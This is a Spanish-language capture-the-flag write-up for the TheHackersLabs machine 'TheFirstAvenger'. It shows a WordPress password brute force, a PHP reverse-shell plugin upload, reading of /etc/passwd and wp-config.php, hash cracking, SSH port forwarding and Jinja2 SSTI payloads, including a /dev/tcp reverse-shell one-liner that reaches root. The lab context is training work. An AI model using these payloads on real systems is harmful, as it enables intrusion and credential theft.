# 🛡️ Resolución del CTF "TheFirstAvenger" | TheHackersLabs

**Plataforma:** TheHackersLabs  
**Nombre de la máquina:** TheFirstAvenger  
**Dificultad:** Fácil  
**Enfoque:** Enumeración web, explotación WordPress, SSTI en Jinja2, port forwarding, escalada a root

---

## 🔍 1. Escaneo de puertos con Nmap

```bash
nmap -p- -- open -sS -sC -sV -- min-rate 5000 -n -vvV -Pn 172.20.10.6 -oN escaneo.txt
```

<img width="818" height="515" alt="1-nmap" src="https://github.com/user-attachments/assets/fa796790-bb09-4f18-a08a-dcdffa81b4f8" /><br>

Servicios detectados:

- 22 → OpenSSH  
- 80 → Apache HTTP

---

## 🌐 2. Análisis del puerto 80 y enumeración

Página WordPress accesible → `/wp-login.php`

Con `gobuster` descubrimos rutas adicionales en `/wp-content`, `/wp-admin`, etc.

<img width="712" height="324" alt="3-gobuster2" src="https://github.com/user-attachments/assets/8ebc05bb-4ea0-49ff-9ec0-1383e4612442" />

---

## 🔍 3. Enumeración WordPress con WPScan

```bash
wpscan -- url http://thefirstavenger.thl/wp1/ \
-- passwords /usr/share/wordlists/rockyou.txt \
-- usernames admin \
-- disable-tls-checks \
-- random-user-agent \
-- max-threads 5 \
-- throttle 1 \
--no-update \
-- no-banner
```

<img width="454" height="273" alt="5-wpscan" src="https://github.com/user-attachments/assets/c4c40cc3-ec48-450b-a154-7dfffa22c5d6" /><br>

<img width="1115" height="338" alt="5-wpscan-password" src="https://github.com/user-attachments/assets/80953654-77a6-4d16-83c7-43ab3b4aef33" /><br>

Credenciales válidas encontradas:

- Usuario: `admin`
- Contraseña: `spongebob`

---

## 🔓 4. Acceso al panel de administración

Se sube una reverse shell como plugin (`revshell.php`) y se activa desde el panel admin.

<img width="395" height="133" alt="7-revshell" src="https://github.com/user-attachments/assets/7836a520-cfe5-45ce-9149-1ae03866b1f6" /><br>

<img width="1121" height="218" alt="8-subir-plugin" src="https://github.com/user-attachments/assets/902db358-590d-4bd5-9425-a62028e2fcd1" />

---

## 🧠 5. Acceso por reverse shell

```bash
nc -lvnp 1234
```

<img width="377" height="20" alt="9-ejecutamos-revshell" src="https://github.com/user-attachments/assets/7acaf9c0-921e-4954-be0b-002fcf98e339" /><br>

<img width="395" height="92" alt="10-netcat" src="https://github.com/user-attachments/assets/871866ec-6e29-4474-9505-47995603db1c" /><br>

Reverse shell conectada desde WordPress con permisos limitados.

---

## 🔐 6. Enumeración de archivos: `wp-config.php`

Se lee `/etc/passwd` y se saca el usuario `steve`:

<img width="385" height="286" alt="11-passwd" src="https://github.com/user-attachments/assets/84471fa4-6233-450b-8da4-4fbd24eab757" /><br>

Se obtienen credenciales de MySQL desde el archivo `wp-config.php`:

<img width="457" height="173" alt="12-wp-config php-password" src="https://github.com/user-attachments/assets/917201ca-0208-43c1-baea-9b0477ea3799" /><br>

Se conecta a MySQL y se accede a la base `topsecret`. Se recuperan hashes de usuarios:

<img width="418" height="463" alt="13-mysql-topsecret" src="https://github.com/user-attachments/assets/b4a5c7b9-54be-4d95-ba88-9951f4c8f455" />

---

## 🔓 7. Cracking de hash

Con `john` y `rockyou.txt` se crackea la contraseña del usuario `steve`.

---

## 💻 8. Acceso SSH como `steve`

```bash
ssh steve@192.168.1.127
```

<img width="507" height="113" alt="14-crackpasswd_john" src="https://github.com/user-attachments/assets/22c944c2-fb5c-4f31-a62d-1e7661ea18bb" />

---

## 🛠️ 9. Detección de puerto interno: 7092

Con `netstat` se detecta un servicio Flask corriendo localmente en el puerto 7092.

```bash
ss -tuln
```

<img width="1042" height="155" alt="16-puerto7092" src="https://github.com/user-attachments/assets/5e8f923b-bb35-4334-9687-f24c40bdafc5" />

---

## 🔄 10. Port Forwarding

```bash
ssh -N -L 87092:127.0.0.1:7092 steve@192.168.1.127
```

<img width="440" height="288" alt="17-port-forwarding" src="https://github.com/user-attachments/assets/0c792fe3-90f4-4df7-b6c6-0a030ab596d6" /><br>

Ahora el servicio Flask es accesible en `http://localhost:87092`

---

## 💥 11. Explotación SSTI en Flask (Jinja2)

Input vulnerable a SSTI → se prueba con payloads como:

```jinja
{{7*7}}
{{config}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
```

<img width="402" height="222" alt="18-SSTI" src="https://github.com/user-attachments/assets/c1961387-0bbd-4c8d-a93c-9c341d1f54e6" /><br>

<img width="833" height="299" alt="19-jinja-SSTI" src="https://github.com/user-attachments/assets/77442a4b-79d0-42ce-ac8b-1d20470a951c" /><br>

```bash
{{ config.__class__.__init__.__globals__['os'].popen('bash -c "sh -i >& /dev/tcp/172.20.10.5/4444 0>&1"').read() }}
```

<img width="635" height="196" alt="20-revshell-SSTI" src="https://github.com/user-attachments/assets/dae02059-e102-474d-853f-3dd5571ac6ed" /><br>

Finalmente se lanza una reverse shell desde la SSTI.

---

## 🚪 12. Acceso como root

Gracias al SSTI ejecutando una shell como root, se obtiene acceso completo:

<img width="313" height="71" alt="21-escalada-root" src="https://github.com/user-attachments/assets/83495f3b-1709-48a3-8eae-bb396a70f6ae" /><br>

```bash
whoami
> root
```

---

## 🏁 13. Conclusión

- Enumeración WordPress y explotación vía plugin
- Reverse shell inicial y análisis de configuración
- Acceso a base de datos y crackeo de hash
- Acceso SSH como `steve`
- Port forwarding y explotación de SSTI
- Escalada a root

CTF con múltiples vectores reales y encadenamiento de técnicas web, hash cracking y explotación de SSTI.

